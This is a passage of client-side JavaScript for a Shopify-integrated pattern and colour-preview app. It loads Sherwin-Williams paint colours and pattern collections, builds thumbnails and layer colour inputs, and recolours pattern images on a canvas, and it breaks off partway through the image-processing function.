  console.log(""✅ Curated colors populated:"", colors.length);
}

function getLayerMappingForPreview(isFurnitureCollection) {
    if (isFurnitureCollection) {
        return {
            type: 'furniture',
            patternStartIndex: 2,      // Pattern layers start at index 2  
            backgroundIndex: 1,        // Sofa base = pattern background (index 1)
            wallIndex: 0               // Wall color (index 0)
        };
    } else {
        return {
            type: 'standard',
            patternStartIndex: 1,      // Pattern layers start at index 1
            backgroundIndex: 0,        // True background
            wallIndex: null            // No wall color
        };
    }
}

function validateLayerMapping() {
    const isFurnitureCollection = appState.selectedCollection?.furnitureType != null || appState.furnitureMode === true;
    const mapping = getLayerMappingForPreview(isFurnitureCollection);
    
    console.log(""🔍 LAYER MAPPING VALIDATION (WITH WALL COLOR):"");
    console.log(""  Collection type:"", isFurnitureCollection ? ""furniture"" : ""standard"");
    console.log(""  Total inputs:"", appState.currentLayers.length);
    console.log(""  Pattern start index:"", mapping.patternStartIndex);
    console.log(""  Background/Sofa base index:"", mapping.backgroundIndex);
    console.log(""  Wall index:"", mapping.wallIndex);
    
    console.log(""  Layer assignments:"");
    appState.currentLayers.forEach((layer, index) => {
        let usage = ""unused"";
        if (index === mapping.wallIndex) {
            usage = ""wall color (via mask)"";
        } else if (index === mapping.backgroundIndex) {
            if (isFurnitureCollection) {
                usage = ""sofa base + pattern background"";
            } else {
                usage = ""pattern background"";
            }
        } else if (index >= mapping.patternStartIndex) {
            usage = `pattern layer ${index - mapping.patternStartIndex}`;
        }
        
        console.log(`    ${index}: ${layer.label} = ""${layer.color}"" (${usage})`);
    });

    // Show the mapping clearly
    if (isFurnitureCollection) {
        console.log(""🔄 FURNITURE COLLECTION MAPPING (WITH WALL MASK):"");
        console.log(""  Pattern Preview:"");
        console.log(`    Background ← Input ${mapping.backgroundIndex} (${appState.currentLayers[mapping.backgroundIndex]?.label})`);
        for (let i = 0; i < (appState.currentLayers.length - mapping.patternStartIndex); i++) {
            const inputIndex = mapping.patternStartIndex + i;
            if (appState.currentLayers[inputIndex]) {
                console.log(`    Pattern Layer ${i} ← Input ${inputIndex} (${appState.currentLayers[inputIndex].label})`);
            }
        }
        console.log(""  Furniture Mockup:"");
        console.log(""    Room Scene ← sofa-capitol.png"");
        console.log(`    Wall Areas ← Input ${mapping.wallIndex} (${appState.currentLayers[mapping.wallIndex]?.label}) via wall mask`);
        console.log(`    Sofa Base ← Input ${mapping.backgroundIndex} (${appState.currentLayers[mapping.backgroundIndex]?.label})`);
        for (let i = 0; i < (appState.currentLayers.length - mapping.patternStartIndex); i++) {
            const inputIndex = mapping.patternStartIndex + i;
            if (appState.currentLayers[inputIndex]) {
                console.log(`    Pattern Layer ${i} ← Input ${inputIndex} (${appState.currentLayers[inputIndex].label})`);
            }
        }
    }
}


function insertTicketIndicator(ticketNumber) {
    const existing = document.getElementById(""ticketIndicator"");
    if (existing) {
        existing.innerHTML = `TICKET<br>${ticketNumber}`;
        return;
    }

    const indicator = document.createElement(""div"");
    indicator.id = ""ticketIndicator"";
    indicator.className = ""w-20 h-20 rounded-full flex items-center justify-center text-center text-xs font-bold text-gray-800"";
    indicator.style.backgroundColor = ""#e5e7eb""; // Tailwind gray-200
    indicator.style.marginRight = ""8px"";
    indicator.innerHTML = `TICKET<br>${ticketNumber}`;

    dom.curatedColorsContainer.prepend(indicator);
}

function promptTicketNumber() {
    const input = prompt(""Enter Sherwin-Williams ticket number (e.g., 280):"");
    const ticketNum = parseInt(input?.trim());
    if (isNaN(ticketNum)) {
        alert(""Please enter a valid numeric ticket number."");
        return;
    }
    runStaticTicket(ticketNum);
}

function runTheTicket(baseColor) {
    console.log(""ðŸŽŸï¸ Running the Ticket for:"", baseColor);

    if (!isAppReady) {
        console.warn(""⚠️ App is not ready yet. Ignoring runTheTicket call."");
        alert(""Please wait while the app finishes loading."");
        return;
    }

    if (!baseColor || !baseColor.hex) {
        console.warn(""âŒ No base color provided to runTheTicket."");
        return;
    }

    if (!Array.isArray(appState.colorsData) || appState.colorsData.length === 0) {
        console.warn(""X¸ Sherwin-Williams colors not loaded yet."");
        alert(""Color data is still loading. Please try again shortly."");
        return;
    }

    const baseHSL = hexToHSL(baseColor.hex);
    if (!baseHSL) {
        console.error(""X Failed to convert base HEX to HSL."");
        return;
    }

    console.log(""+ Base color HSL:"", baseHSL);

    const swColors = appState.colorsData
        .filter(c => c.hex && c.name)
        .map(c => ({
            name: c.name,
            hex: c.hex,
            hsl: hexToHSL(c.hex)
        }));

    console.log(""** Total SW Colors to search:"", swColors.length);

    const scored = swColors
        .map(c => {
            const hueDiff = Math.abs(baseHSL.h - c.hsl.h);
            const satDiff = Math.abs(baseHSL.s - c.hsl.s);
            const lightDiff = Math.abs(baseHSL.l - c.hsl.l);
            return {
                ...c,
                score: hueDiff + satDiff * 0.5 + lightDiff * 0.8
            };
        })
        .sort((a, b) => a.score - b.score)
        .slice(0, appState.currentLayers.length);

    console.log(""ðŸŽ¯ Top Ticket matches:"", scored);

    if (!Array.isArray(appState.layerInputs) || appState.layerInputs.length === 0) {
        console.warn(""âŒ No layer inputs available. Cannot apply ticket."");
        return;
    }

    scored.forEach((ticketColor, idx) => {
        const inputSet = appState.layerInputs[idx];
        if (!inputSet || !inputSet.input || !inputSet.circle) {
            console.warn(`âŒ Missing input or circle at index ${idx}`);
            return;
        }

        const formatted = toInitialCaps(ticketColor.name);
        inputSet.input.value = formatted;
        inputSet.circle.style.backgroundColor = ticketColor.hex;
        appState.currentLayers[idx].color = formatted;

        console.log(`ðŸŽ¯ Layer ${idx + 1} set to ${formatted} (${ticketColor.hex})`);
    });

    insertTicketIndicator(ticketNumber);

    updateDisplays();
    console.log(""✅ Ticket run complete."");
}

function runStaticTicket(ticketNumber) {
    console.log(`ðŸŽ« Static Ticket Requested: ${ticketNumber}`);

    if (!Array.isArray(appState.colorsData) || appState.colorsData.length === 0) {
        alert(""Color data not loaded yet."");
        return;
    }

    const ticketColors = [];
    for (let i = 1; i <= 7; i++) {
        const locatorId = `${ticketNumber}-C${i}`;
        const color = appState.colorsData.find(c => c.locator_id?.toUpperCase() === locatorId.toUpperCase());
        if (color) {
            const displayName = `${color.sw_number?.toUpperCase() || """"} ${toInitialCaps(color.color_name)}`;
            ticketColors.push(displayName.trim());
        }
    }

    if (ticketColors.length === 0) {
        alert(`No colors found for ticket ${ticketNumber}`);
        return;
    }

    appState.curatedColors = ticketColors;
    appState.activeTicketNumber = ticketNumber; // ðŸ†• Track it for label update
    populateCuratedColors(ticketColors);

    console.log(`ðŸŽ¯ Loaded ticket ${ticketNumber} with ${ticketColors.length} colors`);
}


async function initializeApp() {
    console.log(""🚀 Starting app..."");
    
    // Validate DOM elements first
    validateDOMElements();
    
    // ✅ Step 1: Load Sherwin-Williams Colors
    await loadColors();
    console.log(""✅ Colors loaded:"", appState.colorsData.length);

    try {
        // ✅ Step 2: Load Collections
        // Check if data is embedded in window object (Shopify mode)
        let data;
        if (window.ColorFlexData && window.ColorFlexData.collections) {
            console.log(""🎯 Using embedded ColorFlex data"");
            data = { collections: window.ColorFlexData.collections };
        } else {
            console.log(""📁 Loading collections from Shopify assets"");
            const collectionsUrl = window.ColorFlexAssets?.collectionsUrl || ""/assets/collections.json"";
            const response = await fetch(collectionsUrl, { 
                method: 'GET',
                cache: ""no-store"",
                headers: {
                    'Content-Type': 'application/json',
                }
            });
            if (!response.ok) throw new Error(`Failed to fetch collections: ${response.status}`);
            data = await response.json();
        }

        // ADD THIS DEBUG:
        console.log(""🔍 Raw JSON collections loaded:"", data.collections.length);
        const farmhouseCollection = data.collections.find(c => c.name === ""farmhouse"");
        console.log(""🔍 Raw farmhouse collection:"", farmhouseCollection);
        console.log(""🔍 Raw farmhouse elements:"", farmhouseCollection?.elements);


        if (!data.collections?.length) {
            console.error(""X No collections found in collections.json"");
            dom.collectionHeader.textContent = ""No Collections Available"";
            dom.preview.innerHTML = ""<p>No collections available. Please run the data import script.</p>"";
            return;
        }

        // ✅ Step 3: Save collections once
        if (!appState.collections.length) {
            appState.collections = data.collections;
            console.log(""✅ Collections loaded:"", appState.collections.length);
        }

        // ✅ Step 4: Select collection via Shopify integration, URL param, or fallback
        const urlParams = new URLSearchParams(window.location.search);
        const urlCollectionName = urlParams.get(""collection"")?.trim();
        
        console.log(""🔍 COLLECTION SELECTION DEBUG:"");
        console.log(""  URL collection param:"", urlCollectionName);
        console.log(""  Shopify target collection:"", window.appState?.selectedCollection);
        console.log(""  Shopify target pattern:"", window.appState?.targetPattern?.name);
        console.log(""  Available collections:"", appState.collections.map(c => c.name));
        console.log(""  Total collections loaded:"", appState.collections.length);
        
        // Priority 1: Use Shopify-detected collection (from product page integration)
        let collectionName = window.appState?.selectedCollection || urlCollectionName;
        
        let selectedCollection = appState.collections.find(
            c => c.name.trim().toLowerCase() === collectionName?.toLowerCase()
        ) || appState.collections[0];
        
        console.log(""  Selected collection source:"", window.appState?.selectedCollection ? ""Shopify"" : ""URL"");
        console.log(""  Final collection:"", selectedCollection?.name);

        if (!selectedCollection) {
            console.error(""X No valid collection found."");
            return;
        }

        // ✅ Step 5: Set collection in appState
        appState.selectedCollection = selectedCollection;
        appState.lockedCollection = true;
        appState.curatedColors = selectedCollection.curatedColors || [];
        console.log(""@ Selected Collection:"", selectedCollection.name);
        console.log(""@ Curated colors:"", appState.curatedColors.length);

        // ✅ Step 6: Update UI header
        if (dom.collectionHeader) {
            dom.collectionHeader.textContent = toInitialCaps(selectedCollection.name);
        }

        // ✅ Step 7: Show curated color circles + ticket button
        populateCuratedColors(appState.curatedColors);

        // ✅ Step 8: Load target pattern or first pattern
        // Priority 1: Check URL pattern parameter
        let initialPattern = null;
        const urlPatternName = urlParams.get(""pattern"")?.trim();
        if (urlPatternName) {
            // First try to find pattern in selected collection
            initialPattern = selectedCollection.patterns.find(p => 
                p.name?.toLowerCase() === urlPatternName.toLowerCase() ||
                p.id === urlPatternName
            ) || selectedCollection.patterns.find(p => 
                p.name?.toLowerCase().includes(urlPatternName.toLowerCase()) ||
                urlPatternName.toLowerCase().includes(p.name?.toLowerCase())
            );
            
            // If pattern not found in selected collection, search all collections (DYNAMIC)
            if (!initialPattern) {
                console.log(""🔍 Pattern not found in selected collection, searching all collections dynamically..."");
                console.log(`🔍 Searching for pattern: ""${urlPatternName}"" across ${appState.collections.length} collections`);
                
                for (const collection of appState.collections) {
                    console.log(`  🔍 Checking collection: ""${collection.name}"" (${collection.patterns?.length || 0} patterns)`);
                    const foundPattern = collection.patterns?.find(p => {
                        const patternName = p.name?.toLowerCase() || '';
                        const patternId = p.id?.toLowerCase() || '';
                        const searchName = urlPatternName.toLowerCase();
                        
                        // Exact matches first
                        if (patternName === searchName || patternId === searchName) return true;
                        
                        // Partial matches
                        if (patternName.includes(searchName) || searchName.includes(patternName)) return true;
                        
                        // Handle special cases for known patterns
                        if (searchName === 'constantinople' && patternName.includes('constantinople')) return true;
                        if (searchName === 'istanbul' && patternName.includes('istanbul')) return true;
                        
                        return false;
                    });
                    
                    if (foundPattern) {
                        console.log(`🎯 FOUND: Pattern ""${urlPatternName}"" → ""${foundPattern.name}"" in collection ""${collection.name}""`);
                        console.log(`🔄 Switching from collection ""${selectedCollection.name}"" to ""${collection.name}""`);
                        
                        selectedCollection = collection;
                        appState.selectedCollection = selectedCollection;
                        appState.curatedColors = selectedCollection.curatedColors || [];
                        initialPattern = foundPattern;
                        
                        // Update UI to reflect correct collection
                        if (dom.collectionHeader) {
                            dom.collectionHeader.textContent = toInitialCaps(selectedCollection.name);
                        }
                        populateCuratedColors(appState.curatedColors);
                        break;
                    }
                }
                
                if (!initialPattern) {
                    console.warn(`❌ Pattern ""${urlPatternName}"" not found in any collection`);
                }
            }
            console.log(""🎯 Using URL pattern parameter:"", urlPatternName, ""→"", initialPattern?.name, ""in collection:"", selectedCollection?.name);
        }
        
        // Priority 2: Use Shopify-detected target pattern
        if (!initialPattern && window.appState?.targetPattern) {
            initialPattern = selectedCollection.patterns.find(p => 
                p.id === window.appState.targetPattern.id || 
                p.name === window.appState.targetPattern.name
            );
            console.log(""🎯 Using Shopify target pattern:"", initialPattern?.name);
        }
        
        // Priority 3: Use first pattern as fallback
        if (!initialPattern) {
            initialPattern = selectedCollection.patterns[0];
            console.log(""📍 Using first pattern as fallback:"", initialPattern?.name);
        }
        
        const initialPatternId = initialPattern?.id;
        if (initialPatternId) {
            loadPatternData(selectedCollection, initialPatternId);  // ✅ Fixed: pass collection
        } else {
            console.warn(""âš ï¸ No patterns found for"", selectedCollection.name);
        }

        // ✅ Step 9: Load thumbnails + setup print
        populatePatternThumbnails(selectedCollection.patterns);
        setupPrintListener();

        isAppReady = true;
        console.log(""✅ App is now fully ready."");

        function initializeInteractiveZoom() {
            // Set up interactive zoom when app is ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', addInteractiveZoom);
            } else {
                addInteractiveZoom();
            }
        }
        // Call this when collections are loaded
        initializeInteractiveZoom();  // ← Add this line right here
        initializeTryFurnitureFeature();

        console.log(""Current state during app init:"");
console.log(""  furnitureConfig loaded:"", !!furnitureConfig);
console.log(""  appState.selectedCollection:"", !!appState.selectedCollection);
console.log(""  appState.collections:"", !!appState.collections?.length);
console.log(""  DOM ready:"", document.readyState);



    } catch (error) {
        console.error(""X Error loading collections:"", error);
        dom.collectionHeader.textContent = ""Error Loading Collection"";
        dom.preview.innerHTML = ""<p>Error loading data. Please try refreshing.</p>"";
    }
}


// Ensure appState has a default
appState._selectedCollection = null;

// Run on initial load and refresh
window.addEventListener('load', () => {
    initializeApp().catch(error => console.error(""Initialization failed:"", error));
});

window.addEventListener('popstate', () => {
    initializeApp().catch(error => console.error(""Refresh initialization failed:"", error));
});

// Populate pattern thumbnails in sidebar
function populatePatternThumbnails(patterns) {
    console.log(""populatePatternThumbnails called with patterns:"", patterns);
    if (!dom.collectionThumbnails) {
        console.error(""collectionThumbnails not found in DOM"");
        return;
    }
    if (!Array.isArray(patterns)) {
        console.error(""Patterns is not an array:"", patterns);
        return;
    }

    const validPatterns = patterns.filter(p => p && typeof p === 'object' && p.name);
    if (!validPatterns.length) {
        console.warn(""No valid patterns to display"");
        dom.collectionThumbnails.innerHTML = ""<p>No patterns available.</p>"";
        return;
    }

    function cleanPatternName(str) {
        return str
            .toLowerCase()
            .replace(/\.\w+$/, '')
            .replace(/-\d+x\d+$|-variant$/i, '')
            .replace(/^\d+[a-z]+-|-.*$/i, '')
            .replace(/\s+/g, ' ')
            .trim()
            .split(' ')
            .map(word => word.charAt(0).toUpperCase() + word.slice(1))
            .join("" "");
    }

    dom.collectionThumbnails.innerHTML = """";
    console.log(""Cleared existing thumbnails"");

    validPatterns.forEach(pattern => {
        console.log(""Processing pattern:"", pattern);
        pattern.displayName = cleanPatternName(pattern.name);
        const thumb = document.createElement(""div"");
        thumb.className = ""thumbnail cursor-pointer border-1 border-transparent"";
        thumb.dataset.patternId = pattern.id || pattern.name.toLowerCase().replace(/\s+/g, '-');
        thumb.style.width = ""120px"";
        thumb.style.boxSizing = ""border-box"";

        const img = document.createElement(""img"");
        img.src = normalizePath(pattern.thumbnail) || ""https://so-animation.com/colorflex/data/collections/fallback.jpg"";
        img.alt = pattern.displayName;
        img.className = ""w-full h-auto"";
        img.onerror = () => {
            console.warn(`Failed to load thumbnail for ${pattern.displayName}: ${img.src}`);
            if (img.src !== ""https://so-animation.com/colorflex/data/collections/fallback.jpg"") {
                img.src = ""https://so-animation.com/colorflex/data/collections/fallback.jpg"";
                img.onerror = () => {
                    console.warn(`Failed to load fallback for ${pattern.displayName}`);
                    const placeholder = document.createElement(""div"");
                    placeholder.textContent = pattern.displayName || ""Thumbnail Unavailable"";
                    placeholder.style.width = ""100%"";
                    placeholder.style.height = ""80px"";
                    placeholder.style.backgroundColor = ""#e0e0e0"";
                    placeholder.style.border = ""1px solid #ccc"";
                    placeholder.style.display = ""flex"";
                    placeholder.style.alignItems = ""center"";
                    placeholder.style.justifyContent = ""center"";
                    placeholder.style.fontSize = ""12px"";
                    placeholder.style.textAlign = ""center"";
                    placeholder.style.padding = ""5px"";
                    placeholder.style.boxSizing = ""border-box"";
                    thumb.replaceChild(placeholder, img);
                    img.onerror = null;
                    console.log(`Replaced failed thumbnail for ${pattern.displayName} with placeholder div`);
                };
            } else {
                const placeholder = document.createElement(""div"");
                placeholder.textContent = pattern.displayName || ""Thumbnail Unavailable"";
                placeholder.style.width = ""100%"";
                placeholder.style.height = ""80px"";
                placeholder.style.backgroundColor = ""#e0e0e0"";
                placeholder.style.border = ""1px solid #ccc"";
                placeholder.style.display = ""flex"";
                placeholder.style.alignItems = ""center"";
                placeholder.style.justifyContent = ""center"";
                placeholder.style.fontSize = ""12px"";
                placeholder.style.textAlign = ""center"";
                placeholder.style.padding = ""5px"";
                placeholder.style.boxSizing = ""border-box"";
                thumb.replaceChild(placeholder, img);
                img.onerror = null;
                console.log(`Replaced failed thumbnail for ${pattern.displayName} with placeholder div`);
            }
        };

        thumb.appendChild(img);

        const label = document.createElement(""p"");
        label.textContent = pattern.displayName;
        label.className = ""text-center"";
        thumb.appendChild(label);

        if (appState.currentPattern && String(appState.currentPattern.id) === String(pattern.id)) {
            thumb.classList.add(""selected"");
            console.log(`Applied 'selected' class to ${pattern.displayName}`);
        }

        thumb.addEventListener(""click"", (e) => {
            console.log(`Thumbnail clicked: ${pattern.displayName}, ID: ${thumb.dataset.patternId}`);
            handleThumbnailClick(thumb.dataset.patternId);
            document.querySelectorAll("".thumbnail"").forEach(t => t.classList.remove(""selected""));
            thumb.classList.add(""selected"");
        });

        dom.collectionThumbnails.appendChild(thumb);
    });
    console.log(""Pattern thumbnails populated:"", validPatterns.length);

    // Update collection header
    if (dom.collectionHeader) {
        dom.collectionHeader.textContent = toInitialCaps(appState.selectedCollection?.name || ""Unknown"");
        console.log(""Updated collectionHeader:"", dom.collectionHeader.textContent);
    }
}

// Populate coordinates thumbnails in #coordinatesContainer
const populateCoordinates = () => {
    if (!dom.coordinatesContainer) {
        console.error(""coordinatesContainer not found in DOM"");
        return;
    }
    
    dom.coordinatesContainer.innerHTML = """";
    
    const coordinates = appState.selectedCollection?.coordinates || [];
    console.log(""Collection coordinates data:"", coordinates);

    if (!coordinates.length) {
        console.log(""No matching coordinates available for collection:"", appState.selectedCollection?.name);
        return;
    }

    const numCoordinates = coordinates.length;
    const xStep = 80;
    const yStep = 60;
    
    // Get actual container dimensions
    const containerWidth = dom.coordinatesContainer.offsetWidth || 600;
    const containerHeight = dom.coordinatesContainer.offsetHeight || 300;
    
    // Calculate total span and center the layout
    const totalXSpan = (numCoordinates - 1) * xStep;
    const totalYSpan = numCoordinates > 1 ? yStep : 0;
    
    const xStart = (containerWidth / 2) - (totalXSpan / 2);
    const yStart = (containerHeight / 2) - (totalYSpan / 2);

    coordinates.forEach((coord, index) => {
        const div = document.createElement(""div"");
        div.className = ""coordinate-item"";
        
        const xOffset = xStart + (index * xStep);
        const yOffset = yStart + (index % 2 === 0 ? 0 : yStep);
        
        div.style.setProperty(""--x-offset"", `${xOffset}px`);
        div.style.setProperty(""--y-offset"", `${yOffset}px`);

        const img = document.createElement(""img"");
        const normalizedPath = normalizePath(coord.path);
        console.log(`🔍 Coordinate path: ""${coord.path}"" → normalized: ""${normalizedPath}""`);
        img.src = normalizedPath || ""https://so-animation.com/colorflex/data/collections/default-coordinate.jpg"";
        img.alt = coord.pattern || `Coordinate ${index + 1}`;
        img.className = ""coordinate-image"";
        img.dataset.filename = coord.path || ""fallback"";
        
        img.onerror = () => {
            console.warn(`Failed to load coordinate image: ${img.src}`);
            const placeholder = document.createElement(""div"");
            placeholder.className = ""coordinate-placeholder"";
            placeholder.textContent = coord.pattern || ""Coordinate Unavailable"";
            div.replaceChild(placeholder, img);
        };

        div.appendChild(img);
        dom.coordinatesContainer.appendChild(div);
    });
        console.log(""Coordinates populated:"", coordinates.length);
        setupCoordinateImageHandlers();

};

// Populate the layer inputs UI
function populateLayerInputs(pattern = appState.currentPattern) {
  try {
    console.log(""🎛️ populateLayerInputs called with pattern:"", pattern?.name);
    
    if (!pattern) {
      console.error(""❌ No pattern provided or set in appState."");
      return;
    }

    handlePatternSelection(pattern.name);
    appState.layerInputs = [];
    appState.currentLayers = [];

    if (!dom.layerInputsContainer) {
      console.error(""❌ layerInputsContainer not found in DOM"");
      console.log(""🔍 Available DOM elements:"", Object.keys(dom));
      return;
    }
    
    console.log(""✅ layerInputsContainer found:"", dom.layerInputsContainer);

    const designerColors = pattern.designer_colors || [];

    // Get all layers (including shadows)
    const allLayers = buildLayerModel(
      pattern,
      designerColors,
      {
        isWallPanel: appState.selectedCollection?.name === ""wall-panels"",
        tintWhite: appState.tintWhite || false
      }
    );

    // Store all layers in currentLayers
    appState.currentLayers = allLayers;
    dom.layerInputsContainer.innerHTML = """";

    // Create inputs ONLY for non-shadow layers
    const inputLayers = allLayers.filter(layer => !layer.isShadow);
    
    // Add inputs directly to container (no row wrappers)
    inputLayers.forEach(layer => {
      const layerData = createColorInput(
        layer.label,
        layer.inputId,
        layer.color,
        layer.isBackground
      );

      appState.layerInputs.push({
        input: layerData.input,
        circle: layerData.circle,
        label: layerData.label,
        isBackground: layerData.isBackground,
        color: layer.color,
        hex: lookupColor(layer.color) || ""#FFFFFF""
      });

      // Add directly to container - no row grouping needed!
      dom.layerInputsContainer.appendChild(layerData.container);
    });

    console.log(""✅ Populated layerInputs:"", appState.layerInputs.map(l => ({
      label: l.label,
      value: l.input.value
    })));
    
    console.log(""✅ All layers (including shadows):"", appState.currentLayers.map(l => ({
      label: l.label,
      isShadow: l.isShadow,
      path: l.path
    })));
    
    // Add save button after pattern layers are populated
    addSaveButton();
    
    } catch (e) {
        console.error(""❌ Error in populateLayerInputs:"", e);
    }
}

if (USE_GUARD && DEBUG_TRACE) {
  populateLayerInputs = guard(traceWrapper(populateLayerInputs, ""populateLayerInputs""));
} else if (USE_GUARD) {
  populateLayerInputs = guard(populateLayerInputs, ""populateLayerInputs"");
}

if (USE_GUARD && DEBUG_TRACE) {
  populateLayerInputs = guard(traceWrapper(populateLayerInputs, ""populateLayerInputs""));
} else if (USE_GUARD) {
  populateLayerInputs = guard(populateLayerInputs, ""populateLayerInputs"");
}


function handlePatternSelection(patternName, preserveColors = false) {
    console.log(`handlePatternSelection: pattern=${patternName}, lockedCollection=${appState.lockedCollection}, currentCollection=${appState.selectedCollection?.name}`);
    const pattern = appState.selectedCollection.patterns.find(
        p => p.name.toUpperCase() === patternName.toUpperCase()
    ) || appState.selectedCollection.patterns[0];
    if (!pattern) {
        console.error(`Pattern ${patternName} not found in selected collection`);
        return;
    }
    appState.currentPattern = pattern;
    console.log(""Pattern set to:"", appState.currentPattern.name);
    console.log(""Layer labels available:"", appState.currentPattern.layerLabels);
    console.log(""Layers available:"", JSON.stringify(appState.currentPattern.layers, null, 2));

    const designerColors = appState.currentPattern.designer_colors || [];
    const curatedColors = appState.selectedCollection.curatedColors || [];
    const colorSource = designerColors.length > 0 ? designerColors : curatedColors;
    console.log(""Color source:"", JSON.stringify(colorSource, null, 2));

    // Save current color values if preserving
    const savedColors = preserveColors ? 
        appState.currentLayers.map(layer => layer.color) : [];

    appState.currentLayers = [];
    let colorIndex = 0; // ✅ Make sure this is only declared once

    const patternType = getPatternType(pattern, appState.selectedCollection);
    console.log(`🔍 Pattern type detected: ${patternType} for pattern: ${pattern.name} in collection: ${appState.selectedCollection?.name}`);
    const isWallPanel = patternType === ""wall-panel"";
    const isWall = pattern.isWall || isWallPanel;

    if (isWall) {
        const wallColor = colorSource[colorIndex] || ""#FFFFFF"";
        appState.currentLayers.push({ 
            imageUrl: null, 
            color: wallColor, 
            label: ""Wall Color"",
            isShadow: false
        });
        colorIndex++;
    }

    const backgroundColor = colorSource[colorIndex] || ""#FFFFFF"";
    appState.currentLayers.push({ 
        imageUrl: null, 
        color: backgroundColor, 
        label: ""Background"",
        isShadow: false
    });
    colorIndex++;

    if (!appState.currentPattern.tintWhite) {
        const overlayLayers = pattern.layers || [];
        console.log(`Processing ${overlayLayers.length} overlay layers`);
        overlayLayers.forEach((layer, index) => {
            const layerPath = layer.path || """";
            const label = pattern.layerLabels[index] || `Layer ${index + 1}`;
            const isShadow = layer.isShadow === true;
            if (!isShadow) {
                const layerColor = colorSource[colorIndex] || ""#000000"";
                appState.currentLayers.push({
                    imageUrl: layerPath,
                    color: layerColor,
                    label: label,
                    isShadow: false
                });
                console.log(`Assigned color to ${label}: ${layerColor}`);
                colorIndex++;
            }
        });
        console.log(""Final appState.currentLayers:"", JSON.stringify(appState.currentLayers, null, 2));
    }

    // Restore saved colors if preserving
    if (preserveColors && savedColors.length > 0) {
        appState.currentLayers.forEach((layer, index) => {
            if (savedColors[index] && layer.color) {
                layer.color = savedColors[index];
            }
        });
        console.log(""🔄 Colors preserved from previous selection"");
    }
}

function applyColorsToLayerInputs(colors, curatedColors = []) {
    console.log(""Applying colors to layer inputs:"", colors, 
                ""Curated colors:"", curatedColors,
                ""Layer inputs length:"", appState.layerInputs.length,
                ""Current layers length:"", appState.currentLayers.length);
    appState.layerInputs.forEach((layer, index) => {
        if (index >= appState.currentLayers.length) {
            console.warn(`Skipping input ${layer.label} at index ${index}: no corresponding currentLayer`);
            return;
        }
        const color = colors[index] || curatedColors[index] || (layer.isBackground ? ""#FFFFFF"" : ""Snowbound"");
        const cleanColor = color.replace(/^(SW|SC)\d+\s*/i, """").trim();
        const hex = lookupColor(color) || ""#FFFFFF"";
        layer.input.value = toInitialCaps(cleanColor);
        layer.circle.style.backgroundColor = hex;
        console.log(`Applied ${cleanColor} (${hex}) to ${layer.label} input (index ${index})`);
        
        appState.currentLayers[index].color = cleanColor;
    });
    console.log(""Inputs after apply:"", 
                appState.layerInputs.map(l => ({ id: l.input.id, label: l.label, value: l.input.value })));
    updateDisplays();
}

// Highlight active layer
const highlightActiveLayer = (circle) => {
    document.querySelectorAll("".circle-input"").forEach((c) => (c.style.outline = ""none""));
    circle.style.outline = ""6px solid rgb(244, 255, 219)"";
};


// Fixed processImage function with corrected normalization logic
let processImage = (url, callback, layerColor = '#7f817e', gamma = 2.2, isShadow = false, isWallPanel = false, isWall = false) => {
    console.log(""🔍 processImage called from:"", new Error().stack.split('\n')[2]);
    
    // Normalize the URL path to fix ./data/ vs data/ inconsistencies
    const normalizedUrl = normalizePath(url);
    console.log(`Processing image ${url} -> ${normalizedUrl} with color ${layerColor}, Normalization: ${USE_NORMALIZATION}, IsShadow: ${isShadow}, IsWallPanel: ${isWallPanel}, IsWall: ${isWall}`);
    
    const img = new Image();
    img.crossOrigin = ""Anonymous"";
    img.src = `${normalizedUrl}?t=${new Date().getTime()}`;

    img.onload = () => {
        console.log(`✅ Processed image: ${img.src} (${img.naturalWidth}x${img.naturalHeight})`);
        console.log(""Image loaded successfully:"", url);

        const canvas = document.createElement(""canvas"");
        const ctx = canvas.getContext(""2d"");

        const width = img.width;
        const height = img.height;
        canvas.width = width;
        canvas.height = height;

        if (isWall && (!url || url === """")) {
            ctx.fillStyle = layerColor;
            ctx.fillRect(0, 0, width, height);
            console.log(""Applied solid wall color:"", layerColor);
            callback(canvas);
            return;
        }

        ctx.drawImage(img, 0, 0, width, height);
        let imageData;
        try {
            imageData = ctx.getImageData(0, 0, width, height);
        } catch (e) {
            console.warn(""⚠️ Canvas tainted, returning image without processing:"", e.message);
            callback(canvas);
            return;
        }
        const data = imageData.data;

        console.log(""Original Sample (R,G,B,A):"", data[0], data[1], data[2], data[3]);

        let rLayer, gLayer, bLayer;
        if (layerColor && !isShadow) {
            const hex = layerColor.replace(""#"", """");
            rLayer = parseInt(hex.substring(0, 2), 16);
            gLayer = parseInt(hex.substring(2, 4), 16);
            bLayer = parseInt(hex.substring(4, 6), 16);
            console.log(`Layer color parsed: R=${rLayer}, G=${gLayer}, B=${bLayer}`);
        } else if (isShadow) {
            console.log(""Shadow layer: Skipping color parsing"");
        }

        if (isWallPanel && layerColor && !isShadow) {
            // Wall panel processing
            const isDesignLayer = url.toLowerCase().includes(""design"");
            const isBackLayer = url.toLowerCase().includes(""back"");
            const layerType = isDesignLayer ? ""Design"" : isBackLayer ? ""Back"" : ""Other"";
            let designPixelCount = 0;
            let transparentPixelCount = 0;

            console.log(`🔍 Wall panel debug - Layer type: ${layerType}`);
            console.log(`🔍 Data array length: ${data.length}`);
            console.log(`🔍 Image dimensions: ${canvas.width}x${canvas.height}`);
            console.log(`🔍 Expected pixels: ${canvas.width * canvas.height}`);
            console.log(`🔍 First 3 pixels:`, 
                `(${data[0]},${data[1]},${data[2]},${data[3]})`,
                `(${data[4]},${data[5]},${data[6]},${data[7]})`, 
                `(${data[8]},${data[9]},${data[10]},${data[11]})`);

            applyNormalizationProcessing(data, rLayer, gLayer, bLayer);
            
            console.log(`Processed ${layerType} layer: Design pixels=${designPixelCount}, Transparent pixels=${transparentPixelCount}`);
        } else if (isShadow) {
            // Shadow processing
                console.log(""🔍 Processing shadow layer"");

            for (let i = 0; i < data.length; i += 4) {
                const luminance = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
                const alpha = 1 - (luminance / 255);
                data[i] = 0;
                data[i + 1] = 0;
                data[i + 2] = 0;
                data[i + 3] = Math.round(alpha * 255);
            }
        } else if (layerColor && USE_NORMALIZATION) {
            // Standard pattern normalization
            applyNormalizationProcessing(data, rLayer, gLayer, bLayer);
        } else if (layerColor) {
            // Standard brightness-based masking (when normalization is off)
            let recoloredPixels = 0;
            let maskedPixels = 0;

            for (let i = 0; i < data.length; i += 4) {
                const r = data[i];
                const g = data[i + 1];
                const b = data[i + 2];
                const a = data[i + 3];

                const brightness = (r + g + b) / 3;

                if (brightness < 200 && a > 0) {
                    data[i] = rLayer;
